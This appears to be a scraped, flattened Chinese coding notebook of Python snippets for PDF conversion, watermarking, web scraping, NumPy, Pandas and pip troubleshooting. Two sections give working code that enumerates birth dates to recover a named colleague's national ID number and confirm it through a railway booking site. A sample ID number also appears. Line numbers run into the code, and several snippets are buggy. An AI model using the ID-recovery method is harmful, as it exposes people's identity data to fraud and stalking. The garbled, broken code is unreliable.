-hT|grep -w "/"|awk '&#123;print $1&#125;'`b=`df -hT|grep -w "/"|awk '&#123;print $2&#125;'`c=`df -hT|grep -w "/"|awk '&#123;print $3&#125;'`d=`df -hT|grep -w "/"|awk '&#123;print $4&#125;'`e=`df -hT|grep -w "/"|awk '&#123;print $5&#125;'`f=`df -hT|grep -w "/"|awk '&#123;print $6&#125;'`g=`df -hT|grep -w "/"|awk '&#123;print $7&#125;'`html="&lt;html&gt;&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;&lt;head&gt;&lt;style type=\"text/css\"&gt;table&#123;margin-top:5%;width:500px&#125;table.gridtable &#123; font-family: verdana,arial,sans-serif; font-size:14px; color:#333333; border-width: 1px; border-color: #666666; border-collapse: collapse;&#125;table.gridtable th &#123; border-width: 1px; padding: 8px; background-color: #008eff; color:#fff;&#125;table.gridtable td &#123; border-width: 1px; padding: 8px; border-style: solid; border-color: #afafaf; background-color: #ffffff;&#125;table tr:first-child td:first-child, table tr:first-child th:first-child&#123; border-top-left-radius: 5px;&#125;table tr:first-child td:last-child, table tr:first-child th:last-child&#123; border-top-right-radius: 5px;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;table class=\"gridtable\" align=center&gt;&lt;tr&gt; &lt;th colspan="7"&gt;告警主机:192.168.11.1&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt; &lt;td&gt;文件系统&lt;/td&gt;&lt;td&gt;类型&lt;/td&gt;&lt;td&gt;总共&lt;/td&gt;&lt;td&gt;已用&lt;/td&gt;&lt;td&gt;可用&lt;/td&gt;&lt;td&gt;使用率&lt;/td&gt;&lt;td&gt;挂载点&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt; &lt;td&gt;$a&lt;/td&gt;&lt;td&gt;$b&lt;/td&gt;&lt;td&gt;$c&lt;/td&gt;&lt;td&gt;$d&lt;/td&gt;&lt;td&gt;$e&lt;/td&gt;&lt;td style=\"color:red;font-weight:bold\"&gt;$f&lt;/td&gt;&lt;td&gt;$g&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;"echo -e "$html" &gt;/tmp/df.html如果需要使用ssl协议，修改2个地方smtpserver = 'smtp.exmail.qq.com:465' #加上465端口smtp = smtplib.SMTP_SSL() #加上sslhttps://me.jinchuang.org/archives/272.html pdf1234567891011121314151617181920212223import pdfkitpdfkit.from_file('jianshu.htm','out.pdf') pdfkit.from_string('HelloWorld','out.pdf')with open('jianshu.htm','r') as f: pdfkit.from_file(f,'out.pdf') pdfkit.from_url(['https://www.jianshu.com/','https://www.baidu.com/'],'out.pdf') #pdfkit.from_file(['jianshu.htm','jianshu1.htm'],'out.pdf') options=&#123; 'page-size':'A4',#Letter 'margin-top':'0.75in', 'margin-right':'0.75in', 'margin-bottom':'0.75in', 'margin-left':'0.75in', 'encoding':"UTF-8", 'no-outline':None &#125; pdfkit.from_url('https://www.jianshu.com/','out1.pdf', options=options) https://juejin.im/post/5ce69794e51d4577523f22ef 天善博客内容如何转成PDF文档1234567wkhtmltopdf 'http://www.flybi.net/blog/seng/3645' 'http://www.flybi.net/blog/seng/3599' sengblog.pdfwkhtmltopdf --javascript-delay 2000 'http://www.flybi.net/blog/seng/3645' 'http://www.flybi.net/blog/seng/3599' sengblog.pdfwkhtmltopdf --dump-outline out.xsl toc 'http://www.flybi.net/blog/seng/3645' 'http://www.flybi.net/blog/seng/3599' sengblog.pdfhttps://ask.hellobi.com/blog/seng/3691 如何批量添加图片水印123456789101112131415161718192021222324252627282930313233343536python 利用opencv去除图片水印 https://mp.weixin.qq.com/s/BqeBk0oPP1KpueviCwZFFQhttps://mp.weixin.qq.com/s/QnMzvq_VWs2HyKHhD4FxQgimport os,tracebackfrom PIL import Image# 获取文件夹图片def get_folder(fpath,wm_file,save_path): try: img_suffix_list = ['png', 'jpg', 'bmp'] for i in os.listdir(fpath): if i.split('.')[-1] in img_suffix_list: img_path = fpath + '/' + i img_water_mark(img_file=img_path,wm_file=wm_file,save_path=save_path) except Exception as e: print(traceback.print_exc())# 图片添加水印def img_water_mark(img_file, wm_file,save_path): try: img = Image.open(img_file) # 打开图片 watermark = Image.open(wm_file) # 打开水印 img_size = img.size wm_size = watermark.size # 如果图片大小小于水印大小 if img_size[0] &amp;lt; wm_size[0]: watermark.resize(tuple(map(lambda x: int(x * 0.5), watermark.size))) print('图片大小：', img_size) wm_position = (img_size[0]-wm_size[0],img_size[1]-wm_size[1]) # 默认设定水印位置为右下角 layer = Image.new('RGBA', img.size) # 新建一个图层 layer.paste(watermark, wm_position) # 将水印图片添加到图层上 mark_img = Image.composite(layer, img, layer) new_file_name = '/new_'+img_file.split('/')[-1] mark_img.save(save_path + new_file_name) except Exception as e: print(traceback.print_exc()) 爬虫简书12345678910111213141516171819202122232425262728293031import requestsfrom lxml import etreemy_header = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"res = requests.get(url='https://www.jianshu.com/users/5aa8494a18c8/timeline', headers=&#123;'user-agent': my_header&#125;)if '666' in res.text: print('found')page = etree.HTML(res.text)last_li = page.xpath('''//ul[@class="note-list"]/li[last()]''')[0]max_id = int(last_li.get('id').split('-')[1]) - 1file = open("activity.txt",'w',encoding='utf-8')page = 2while True: res = requests.get(url='https://www.jianshu.com/users/5aa8494a18c8/timeline?max_id=%s&amp;page=%s' %(max_id,page), headers=&#123;'user-agent': my_header, 'X-INFINITESCROLL':'true'&#125;) last_li = etree.HTML(res.text).xpath('''/html/body/li[last()]''')[0] max_id = int(last_li.get('id').split('-')[1]) - 1 page = page + 1 file.write(res.text) file.write("\n") if '加入了简书' in res.text: print('end') breakfile.close()https://www.jianshu.com/p/35a85ee14f7b markdown 转PDF1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495pip install markdown markdown.markdown() 函数就可以读取 md 文件里的内容了先转HTML import markdownimport osimport codecs'''savepath = "F:\RenZhengfei"os.chdir(savepath)file = codecs.open("README.md", mode="r", encoding="utf-8")text = file.read()html = markdown.markdown(text)print(html)with open('file_name.html', 'w') as f: f.write(html)'''head = """&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html;charset=utf-8" /&gt;&lt;style type="text/css"&gt;code &#123; color: inherit; background-color: rgba(0, 0, 0, 0.05);&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;"""foot = """&lt;/body&gt;&lt;/html&gt;"""filepath = "F:\RenZhengfei-master\ALL"savepath = "F:\RenZhengfei-master\ALL-html"if not os.path.isdir(savepath): os.mkdir(savepath)os.chdir(savepath)i = 0pathDir = os.listdir(filepath)for allDir in pathDir: if (allDir == "pdf"): continue name = allDir print(name) os.chdir(filepath) fp1 = codecs.open(name, mode="r", encoding="utf-8") text = fp1.read() html = markdown.markdown(text) fp1.close() #print(html) fname = name.replace('md', 'html') #f2 = '%s.html' % (fname) os.chdir(savepath) fp2 = codecs.open(fname, "w", encoding="utf-8", errors="xmlcharrefreplace") fp2.write(head + html + foot) fp2.close()print(i)https://wemp.app/posts/6f807ecf-9ebd-4449-b419-2cfbf8c2e41fimport timeimport pdfkitimport oswk_path = r'E:\Program Files\wkhtmltox\bin\wkhtmltopdf.exe'config = pdfkit.configuration(wkhtmltopdf=wk_path)filepath = "F:\RenZhengfei-master\ALL-html"savepath = "F:\RenZhengfei-master\ALL-pdf"time1 = time.time()pathDir = os.listdir(filepath)for allDir in pathDir: if (allDir == "pdf"): continue name = allDir print(name) htmlpath=filepath+"\\"+name print(htmlpath) name = name.replace('html', 'pdf') os.chdir(savepath) pdfkit.from_url(htmlpath, name, configuration=config)#pdfkit.from_url(url, name, configuration=config)time2 = time.time()print(str(time2 - time1)+" s") 验证身份证号12345678910111213141516171819202122232425262728import time#生成出生当年所有日期def dateRange(year): fmt = '%Y-%m-%d' bgn = int(time.mktime(time.strptime(year+'-01-01',fmt))) end = int(time.mktime(time.strptime(year+'-12-31',fmt))) list_date = [time.strftime(fmt,time.localtime(i)) for i in range(bgn,end+1,3600*24)] return [i.replace('-','') for i in list_date]data_time = dateRange('1993')from id_validator import validator#遍历所有日期，print通过校验的身份证号码pip install id-validatordef vali_dator(id1,id2,id3): for i in dateRange(id2): theid = id1 + i + id3 if validator.is_valid(theid): print(theid)vali_dator('330221','1993','4914')https://mp.weixin.qq.com/s?__biz=MzU5MjI3NzIxMw==&amp;mid=2247486816&amp;idx=1&amp;sn=baa976db515e3b9b99e7001daa9a577a&amp;chksm=fe2376d2c954ffc486625e5420e3ebcf3d83581986b0568b804fb5a54e4aaa032b4992c13905&amp;mpshare=1&amp;scene=1&amp;srcid=1023PX0DRWmDc5E8oEZSVUx6&amp;sharer_sharetime=1571795782903&amp;sharer_shareid=43165518fc08bc947dca48788293333a&amp;key=6f23511bf9e1c01f4c78d4f8f46e1b1e8fc6e548405a6029e3b015de7441c1527cd4817fc238470a3211f36f03178e6f7f9888d5f7d1ee5e6ef6b0b0fced5da2f45aa739e184ae5749a86f5102efd4f9&amp;ascene=1&amp;uin=NjQ3OTQwMTAy&amp;devicetype=Windows+7&amp;version=62070152&amp;lang=zh_CN&amp;pass_ticket=Nl73k%2FpmXYhrLnAbsjSStmagh1FEZZkB8fhtyVf9%2BmzY8foNNpPw%2FmaVHa2zPKdu#print(validator.get_info('330221199306084914'))https://github.com/zpw1995/aotodata/blob/master/interest/ID_card/ID_card.py NumPy 基础123456789101112131415161718192021222324252627NumPy 的主要对象是多维数组 Ndarray。在 NumPy 中维度（dimensions）叫做轴（axes），轴的个数叫做秩（rank）&gt;&gt;&gt; np.array([1, 2, 3])array([1, 2, 3])&gt;&gt;&gt; np.array([(1, 2, 3), (4, 5, 6)])array([[1, 2, 3], [4, 5, 6]])&gt;&gt;&gt; np.zeros((3, 3))array([[0., 0., 0.], [0., 0., 0.], [0., 0., 0.]])&gt;&gt;&gt; np.arange(5)array([0, 1, 2, 3, 4])&gt;&gt;&gt; np.arange(6).reshape(2, 3)array([[0, 1, 2], [3, 4, 5]]) &gt;&gt;&gt; np.random.rand(2, 3) array([[0.50122984, 0.98824375, 0.81388012], [0.60951775, 0.02055326, 0.97622093]]) &gt;&gt;&gt; np.random.randint(5, size=(2, 3)) array([[2, 0, 2], [4, 4, 4]]) https://learnku.com/articles/35684 &gt;&gt;&gt; a = np.array([1, 2, 3, 4, 5]) &gt;&gt;&gt; b = np.arange(1, 6) &gt;&gt;&gt; a, b (array([1, 2, 3, 4, 5]), array([1, 2, 3, 4, 5])) ###12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364爬取豆瓣电影TOP250import requestsfrom bs4 import BeautifulSoupurl = 'https://movie.douban.com/top250'# 使用U-A伪装成浏览器发送请求headers = &#123;'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'&#125;# 先使用requests发送网络请求从而获取网页r = requests.get('https://movie.douban.com/top250', headers=headers)# 使用bs4解析获取的网页soup = BeautifulSoup(r.text, 'html.parser')# 调用prettify()方法来使解析的HTML更加规范化print(soup.prettify())movie_list = soup.find('ol', attrs=&#123;'class': 'grid_view'&#125;) #电影列表for movie in movie_list.find_all('li'): movie_name = movie.find('span', attrs=&#123;'class': 'title'&#125;) print(movie_name.get_text()) 肖申克的救赎霸王别姬这个杀手不太冷阿甘正传美丽人生import codecsimport requestsfrom bs4 import BeautifulSoupDOWNLOAD_URL = 'https://movie.douban.com/top250'def download_page(url): return requests.get(url, headers=&#123; 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36' &#125;).contentdef parse_html(html): soup = BeautifulSoup(html, 'html.parser') # 电影列表 movie_list_soup = soup.find('ol', attrs=&#123;'class': 'grid_view'&#125;) movie_name_list = [] for movie_li in movie_list_soup.find_all('li'): movie_name = movie_li.find('span', attrs=&#123;'class': 'title'&#125;).get_text() movie_info = movie_li.find('div', attrs=&#123;'class': 'bd'&#125;).find('p').get_text() movie_star = movie_li.find('span', attrs=&#123;'class': 'rating_num'&#125;).get_text() movie_name_list.append(movie_name) movie_name_list.append(movie_info) movie_name_list.append(movie_star) # 下一页链接 next_page = soup.find('span', attrs=&#123;'class': 'next'&#125;).find('a') if next_page: return movie_name_list,DOWNLOAD_URL + next_page['href'] return movie_name_list, Nonedef main(): url = DOWNLOAD_URL with codecs.open('movies','wb', encoding='utf-8') as f: while True: html = download_page(url) movies, url =parse_html(html) f.write(u'&#123;movies&#125;\n'.format(movies='\n'.join(movies)))if __name__ == '__main__': main()https://www.jianshu.com/p/8a460be5a26e 把bmp和png转换成jpg12345678910111213141516import osfrom PIL import Imagefor root, dirs, files in os.walk("."): for bmpfig in files: if not bmpfig.endswith('.bmp') and not bmpfig.endswith('.png'): continue bmpfig = os.path.join(root, bmpfig) newfigname = bmpfig[:-4] + ".jpg" print "converting from", bmpfig, "to", newfigname img = Image.open(bmpfig) img = img.convert('RGB') # for png img.save(newfigname, format='jpeg', quality=95) img.close() os.remove(bmpfig)https://zjyfdu.github.io/2018/08/16/python%E6%8A%8Abmp%E8%BD%AC%E6%8D%A2%E6%88%90jpg/ numpy1234567891011121314151617181920212223242526272829303132import numpy as np&gt;&gt;&gt; print(np.__version__)1.16.2&gt;&gt;&gt; np.array([1, 2, 3])array([1, 2, 3])&gt;&gt;&gt; np.arange(5)array([0, 1, 2, 3, 4])&gt;&gt;&gt; np.arange(6).reshape(2, 3)array([[0, 1, 2], [3, 4, 5]])&gt;&gt;&gt; np.random.rand(2, 3)array([[0.50122984, 0.98824375, 0.81388012], [0.60951775, 0.02055326, 0.97622093]]) &gt;&gt;&gt; np.random.randint(5, size=(2, 3)) array([[2, 0, 2], [4, 4, 4]]) &gt;&gt;&gt; a = np.array([1, 2, 3, 4, 5]) &gt;&gt;&gt; b = np.arange(1, 6) &gt;&gt;&gt; a + b array([ 2, 4, 6, 8, 10]) &gt;&gt;&gt; np.sin(a) array([-0.54402111, 0.91294525, -0.98803162, 0.74511316, -0.26237485]) &gt;&gt;&gt; np.sqrt(a) array([3.16227766, 4.47213595, 5.47722558, 6.32455532, 7.07106781]) &gt;&gt;&gt; a ** 0.5 # 等价于np.sqrt(a) array([3.16227766, 4.47213595, 5.47722558, 6.32455532, 7.07106781]) &gt;&gt;&gt; np.power(a, 3) array([ 1000, 8000, 27000, 64000, 125000]) &gt;&gt;&gt; a ** 3 # 等价于np.power(a, 3) https://learnku.com/articles/35686 pdf to image123456789101112131415161718https://github.com/freedesktop/poppler pdftoppm -singlefile -f 4 -r 72 -jpeg -jpegopt quality=90 presentation.pdf test_popplerpdftoppm -f 1 -r 72 -jpeg -jpegopt quality=90 test_20191120_134947.pdf test_poppler转换所有 生成多个图片from pdf2image import convert_from_pathdef main(): pages = convert_from_path("presentation.pdf", first_page=2, single_file=True) pages[0].save("test_pdf2image.jpg", quality=85)if __name__ == "__main__": main()https://jdhao.github.io/2019/11/14/convert_pdf_to_images_pdftoppm/https://imagemagick.org/script/download.phpconvert -density 150 presentation.pdf -quality 90 output-%3d.jpghttps://jdhao.github.io/2019/11/20/convert_pdf_to_image_imagemagick/#convert-all-pages-of-pdf-file-to-images 图片exif123456789101112131415161718192021222324252627https://www.irfanview.com/from PIL import Imagefrom PIL. from PIL.ExifTags import TAGSimg = Image.open('test.jpg')exif = img.getexif()for k, v in exif.items(): print('&#123;&#125;: &#123;&#125;'.format(TAGS[k], v)) from PIL import Image import piexif img = Image.open('test.jpg') if "exif" in img.info: exif_dict = piexif.load(img.info['exif']) if piexif.ImageIFD.Orientation in exif_dict['0th']: exif_dict['0th'][pixeif.ImageIFD.Orientation] = 3 # quick and dirty work around to avoid type error exif_dict['Exif'][41729] = b'1' exif_bytes = piexif.dump(exif_dict) img.save('new_img.jpg', exif=exif_bytes) https://jdhao.github.io/2019/07/31/image_rotation_exif_info/ 命令行里处理数据科学问题123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051curl -o data_dl.csv https://archive.ics.uci.edu/ml/machine-learning-databases/blood-transfusion/transfusion.dataRecency (months),Frequency (times),Monetary (c.c. blood),Time (months),"whether he/she donated blood in March 2007"2 ,50,12500,98 ,10 ,13,3250,28 ,11 ,16,4000,35 ,12 ,20,5000,45 ,11 ,24,6000,77 ,0pip install csvkitcsvclean data_dl.csvcsvcut -n data_dl_out.csv | cut -c6-Recency (months)Frequency (times)Monetary (c.c. blood)Time (months)whether he/she donated blood in March 2007csvstat --mean data_dl_out.csv1. a: 373.52. Recency (months): 9.5073. Frequency (times): 5.5154. Monetary (c.c. blood): 1,378.6765. Time (months): 34.2826. whether he/she donated blood in March 2007: Noneimport pandas as pddata = pd.read_csv('data_dl_out.csv')data.head()data = data.rename(columns=&#123;'Recency (months)': 'recency', 'Frequency (times)': 'frequency', 'Monetary (c.c. blood)': 'volumne', 'Time (months)': 'time', 'whether he/she donated blood in March 2007': 'target'&#125;)data.to_csv('data_clean.csv') recency frequency volumne time target0 2 50 12500 98 11 0 13 3250 28 12 1 16 4000 35 13 2 20 5000 45 1csvsql --query "select frequency, count(*) as rows from data_clean where target = 1 group by frequency order by 2 desc" data_clean.csvd:\python\lib\site-packages\win32\lib\pywintypes.py:2: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative usesd:\python\lib\site-packages\agate\utils.py:276: UnnamedColumnWarning: Column 0 has no name. Using "a".frequency,rows1.0,205.0,202.0,196.0,17https://oicebot.github.io/2019/07/25/five-command-line-tools-for-data-science.html Pandas 做数据分析sql1234567891011121314151617181920212223242526272829303132333435363738394041import pandas as pdimport numpy as npurl = ('https://raw.github.com/pandas-dev/pandas/master/pandas/tests/data/tips.csv')tips = pd.read_csv(url)output = tips.head()sql 语句： SELECT total_bill, tip, smoker, time FROM tips LIMIT 5;。output = tips[['total_bill', 'tip', 'smoker', 'time']].head(5) total_bill tip smoker time0 16.99 1.01 No Dinner1 10.34 1.66 No Dinner2 21.01 3.50 No Dinner3 23.68 3.31 No Dinner4 24.59 3.61 No Dinnersql 语句： SELECT * FROM tips WHERE time = 'Dinner' LIMIT 5;output = tips[tips['time'] == 'Dinner'].head(5)# 或者output = tips.query("time == 'Dinner'").head(5)sql 语句：SELECT * FROM tips WHERE time = 'Dinner';。output = tips[(tips['time'] == 'Dinner')]sql 语句：SELECT * FROM tips WHERE time = 'Dinner' AND tip &gt; 5.00;output = tips[(tips['time'] == 'Dinner') &amp; (tips['tip'] &gt; 5.00)]sql 语句：SELECT * FROM tips WHERE size &gt;= 5 OR total_bill &gt; 45;。output = tips[(tips['size'] &gt;= 5) | (tips['total_bill'] &gt; 45)]sql 语句：SELECT * FROM tips WHERE siez in (5, 6);。output = tips[tips['size'].isin([2, 5])]sql 语句：SELECT sex, count(*) FROM tips GROUP BY sex;https://learnku.com/articles/29825#repliesoutput = tips.groupby('sex').size()转数组&gt;&gt;&gt; tips.total_bill.head().tolist()[16.99, 10.34, 21.01, 23.68, 24.59]&gt;&gt;&gt; tips.columns.tolist()['total_bill', 'tip', 'sex', 'smoker', 'day', 'time', 'size'] 在 Python 里用 is 进行比较1234567891011121314if appointment.time_slot_id is time_slot.id: time_slot_appointments.append(appointment)出问题的地方就是这个 is 啦。但最诡异的是，当 time_slot_id 和 time_slot.id 都是小于等于 256 的整型数字时，这段代码一点问题都没有；只有当预约数量达到一定程度，使得 time_slot_id 或 time_slot.id 大于 256 时，问题就出现了——这个表达式永远返回 False使用 is 关键字进行的比较是“引用比较”。这里的“引用”就相当于一个索引号，一个地址，或是指向一个对象的指针。用 is 进行比较正是造成这个奇怪 bug 的根源。使用 == 操作符进行的比较是“值比较”，也就是比较两个对象的“值”。在 Python 中，数值型的整型数据是以 PyObject 对象的一个子类型： PyLong 对象的形式存储的。为了减少内存管理在处理小整型数字时候的开销，在 CPython 解释器中使用了“小整数对象池”进行优化。也就是说，值为 -5 到 256 的 PyLong 对象已经预置在 CPython 解释器的私有堆中，可以通过 small_ints 这个数组进行访问。要想修复这个 bug，其中一种方式是，把：if appointment.time_slot_id is time_slot.id:改成：if appointment.time_slot.id is time_slot.id:只有当你十分确定要比较的是两个对象本身的时候，才用 is 进行比较。https://oicebot.github.io/2019/07/11/the-dangers-of-using-is-in-python.html 判断括号字符串12345678910def isValid(self, s): stack = [] paren_map = &#123;')':'(', ']':'[', '&#125;':'&#123;'&#125; for c in s: if c not in paren_map: stack.apend(c) elif not stack or paren[c] != stack.pop(): return False return not stack Could not fetch URL https://pypi.org/simple/pip/: There was a problem confirming the ssl certificate1234567891011121314151617181920212223242526272829303132pip install iredisWARNING: Retrying (Retry(total=4, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate in certificate chain (_ssl.c:1045)'))': /simple/iredis/WARNING: Retrying (Retry(total=3, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate in certificate chain (_ssl.c:1045)'))': /simple/iredis/WARNING: Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate in certificate chain (_ssl.c:1045)'))': /simple/iredis/WARNING: Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate in certificate chain (_ssl.c:1045)'))': /simple/iredis/WARNING: Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate in certificate chain (_ssl.c:1045)'))': /simple/iredis/Could not fetch URL https://pypi.org/simple/iredis/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host='pypi.org', port=443): Max retries exceeded with url: /simple/iredis/ (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate in certificate chain (_ssl.c:1045)'))) - skippingERROR: Could not find a version that satisfies the requirement iredis (from versions: none)ERROR: No matching distribution found for iredisCould not fetch URL https://pypi.org/simple/pip/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host='pypi.org', port=443): Max retries exceeded with url: /simple/pip/ (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate in certificate chain (_ssl.c:1045)'))) - skipping到https://pypi.python.org/pypi/pip#downloads下载 https://files.pythonhosted.org/packages/ce/ea/9b445176a65ae4ba22dce1d93e4b5fe182f953df71a145f557cffaffc1bf/pip-19.3.1.tar.gz解压出setup.py 执行python setup.py installInstalling pip.exe script to D:\python\ScriptsInstalling pip.exe.manifest script to D:\python\ScriptsInstalling pip3-script.py script to D:\python\ScriptsInstalling pip3.exe script to D:\python\ScriptsInstalling pip3.exe.manifest script to D:\python\ScriptsInstalling pip3.7-script.py script to D:\python\ScriptsInstalling pip3.7.exe script to D:\python\ScriptsInstalling pip3.7.exe.manifest script to D:\python\ScriptsInstalled d:\python\lib\site-packages\pip-19.3.1-py3.7.eggProcessing dependencies for pip==19.3.1Finished processing dependencies for pip==19.3.1pip install --trusted-host pypi.org --trusted-host files.pythonhosted.org iredisCollecting iredis Downloading https://files.pythonhosted.org/packages/5c/1f/2da6df9c698a586f66bbb4153b7b2a75c62ce1e94aaf04ffaed1954163ad/iredis-0.7.0-py3-none-any.whl (42kB) |████████████████████████████████| 51kB 363kB/sCollecting click8&lt;9,&gt;=8 单行代码123456789101112131415161718# 字典推导&#123;v: k for k, v in some_dict.items()&#125;# 集合推导&#123;x**2 for x in [1, 1, 2]&#125;# 列表推导[i for i in range(30) if i % 3 is 0]a_list = [[1, 2], [3, 4], [5, 6]]print(list(itertools.chain.from_iterable(a_list)))# Output: [1, 2, 3, 4, 5, 6]sum(a_list,[])[1, 2, 3, 4, 5, 6]# orprint(list(itertools.chain(*a_list)))# Output: [1, 2, 3, 4, 5, 6]python -c "import csv,json;print json.dumps(list(csv.reader(open('csv_file.csv'))))"python -m cProfile my_script.pycat file.json | python -m json.toolhttps://learnku.com/articles/39048#reply125307 python算出了同事的身份证号码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647//https://mp.weixin.qq.com/s?__biz=MzU5MjI3NzIxMw==&amp;mid=2247486816&amp;idx=1&amp;sn=baa976db515e3b9b99e7001daa9a577a&amp;chksm=fe2376d2c954ffc486625e5420e3ebcf3d83581986b0568b804fb5a54e4aaa032b4992c13905&amp;mpshare=1&amp;scene=1&amp;srcid=1023PX0DRWmDc5E8oEZSVUx6&amp;sharer_sharetime=1571795782903&amp;sharer_shareid=43165518fc08bc947dca48788293333a&amp;key=6f23511bf9e1c01f4c78d4f8f46e1b1e8fc6e548405a6029e3b015de7441c1527cd4817fc238470a3211f36f03178e6f7f9888d5f7d1ee5e6ef6b0b0fced5da2f45aa739e184ae5749a86f5102efd4f9&amp;ascene=1&amp;uin=NjQ3OTQwMTAy&amp;devicetype=Windows+7&amp;version=62070152&amp;lang=zh_CN&amp;pass_ticket=Nl73k%2FpmXYhrLnAbsjSStmagh1FEZZkB8fhtyVf9%2BmzY8foNNpPw%2FmaVHa2zPKdu用python生成1993年的所有日期吧import time#生成出生当年所有日期def dateRange(year): fmt = '%Y-%m-%d' bgn = int(time.mktime(time.strptime(year+'-01-01',fmt))) end = int(time.mktime(time.strptime(year+'-12-31',fmt))) list_date = [time.strftime(fmt,time.localtime(i)) for i in range(bgn,end+1,3600*24)] return [i.replace('-','') for i in list_date]data_time = dateRange('1993')pip install id-validatorfrom id_validator import validator#遍历所有日期，print通过校验的身份证号码def vali_dator(id1,id2,id3): for i in dateRange(id2): theid = id1 + i + id3 if validator.is_valid(theid): print(theid)vali_dator('330221','1993','4914')打开12306官网，在12306添加常用联系人，将李大伟+身份证号依次输入。若身份证和姓名一致，就会显示校验通过；若不能通过，则说明身份证和姓名不一致。 https://github.com/zpw1995/aotodata/tree/master/interest/ID_card b站弹幕12345678910111213141516from bs4 import BeautifulSoupimport pandas as pdimport requests#https://github.com/zpw1995/aotodata/blob/master/bilibili_danmu/B%E7%AB%99%E5%BC%B9%E5%B9%95%E7%88%AC%E8%99%AB.pyurl = 'http://comment.bilibili.com/123519261.xml'html = requests.get(url)html.encoding='utf8'soup = BeautifulSoup(html.text, 'lxml')results = soup.find_all('d')comments = [comment.text for comment in results]comments_dict = &#123;'comments': comments&#125;df = pd.DataFrame(comments_dict)df.to_csv('bili_ai5.csv', encoding='utf-8-sig') Pandas12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576 import pandas as pd #读取csv df = pd.read_csv('xxx.csv') #pkl格式https://learnku.com/articles/39739 df.to_pickle('xxx.pkl') #格式另存 df = pd.read_pickle('xxx.pkl') #读取 #hdf格式df.to_hdf('xxx.hdf','df') #格式另存df = pd.read_hdf('xxx.pkl','df') #读取boolean=[True,False]gender=["男","女"]color=["white","black","yellow"]data=pd.DataFrame(&#123; "height":np.random.randint(150,190,100), "weight":np.random.randint(40,90,100), "smoker":[boolean[x] for x in np.random.randint(0,2,100)], "gender":[gender[x] for x in np.random.randint(0,2,100)], "age":np.random.randint(15,90,100), "color":[color[x] for x in np.random.randint(0,len(color),100) ]&#125;)&gt;&gt;&gt; data height weight smoker gender age color0 186 77 False 女 59 black1 162 62 False 女 75 yellow2 187 78 False 男 66 black3 166 45 True 男 38 white#①使用字典进行映射data["gender"] = data["gender"].map(&#123;"男":1, "女":0&#125;)#②使用函数def gender_map(x): gender = 1 if x == "男" else 0 return gender#注意这里传入的是函数名，不带括号data["gender"] = data["gender"].map(gender_map)def apply_age(x,bias): return x+bias#以元组的方式传入额外的参数data["age"] = data["age"].apply(apply_age,args=(-3,))# 沿着0轴求和data[["height","weight","age"]].apply(np.sum, axis=0)# 沿着0轴取对数data[["height","weight","age"]].apply(np.log, axis=0)def BMI(series): weight = series["weight"] height = series["height"]/100 BMI = weight/height**2 return BMIdata["BMI"] = data.apply(BMI,axis=1)df.applymap(lambda x:"%.2f" % x)https://learnku.com/articles/39734In [12]: data.groupby("company").agg('mean')Out[12]: salary agecompanyA 21.50 27.50B 13.00 29.00C 29.25 27.25In [17]: data.groupby('company').agg(&#123;'salary':'median','age':'mean'&#125;)Out[17]: salary agecompanyA 21.5 27.50B 10.0 29.00C 30.0 27.25In [24]: data['avg_salary'] = data.groupby('company')['salary'].transform('mean')https://learnku.com/articles/39735 requests 抓取网页的通用框架12345678910111213141516171819# -*- coding: utf-8 -*- import requestsdef getHtmlText(url): try: response = requests.get(url) # 如果状态码不是 200, 则应发 HTTPERROR 异常 response.raise_for_status() # 设置正确的编码方式 response.encoding = response.apparent_encoding return response.text except: return "Something Wrong!"url = 'http://www.baidu.com'result = getHtmlText(url)print(result)http://www.siya89.com/blog/python%20zero Could not fetch URL1234567891011121314151617181920212223242526272829 pip install -U requestsWARNING: Retrying (Retry(total=4, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate in certificate chain (_ssl.c:1045)'))': /simple/requests/WARNING: Retrying (Retry(total=3, connect=None, read=None, redirect=None, 